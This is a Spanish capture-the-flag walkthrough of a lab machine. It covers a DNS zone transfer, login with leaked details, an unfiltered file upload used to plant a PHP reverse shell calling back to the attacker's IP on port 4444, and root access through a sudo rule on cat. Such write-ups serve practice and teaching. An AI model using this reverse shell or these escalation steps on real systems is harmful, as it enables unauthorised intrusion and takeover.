## Reconocimiento

Puerto 22 : SSH

Puerto 53 : Domain DNS

Puerto 80 : HTTP

En la web nos revela un dominio:

```bash
http://hackzones.hl
```

Es un panel de login, intento Sqlmap pero no es vulnerable.

Conociendo el puerto 53 realizo una transferencia de zona del archivo DNS:

```bash
dig @172.17.0.2 hackzone.hl AXFR
```

El archivo contiene una cuenta de correo:

```bash
mrRobot@hackzone.hl
```

Las pruebo como credenciales en el panel de login y funciona. 

Accedo a un panel donde nos pide cambiar la foto de perfil, pero no filtra bien la extensión y se puede subir cualquier archivo, así que subiré un código en php para mandarme una conexión:

shell.php

```bash
<?php
$sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Me pongo en escucha:

```bash
nc -lnvp 4444
```

Ejecuto:

```bash
http://hackzones.hl/uploads/shell.php
```

## Escalada www-data → mrrobot

```bash
cd /var/www/html/supermegaultrasecretfolder
```

Dentro hay un script llamado secret.sh que solo puede ser ejecutado como root.

Me lo transfiero a mi maquina host y lo ejecuto desde ahí:

```bash
sudo bash secret.sh
# info:
Password@$$!123
```

## Escalada mrrobot → root

```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/cat
```

Dentro del directorios /opt esta un archivo que no se puede leer sin ser root, así que se aprovecha el binario para leerlo:

```bash
sudo cat SistemUpdate
```

Dentro están las credenciales de root:

```bash
root:rooteable
```

Listo.
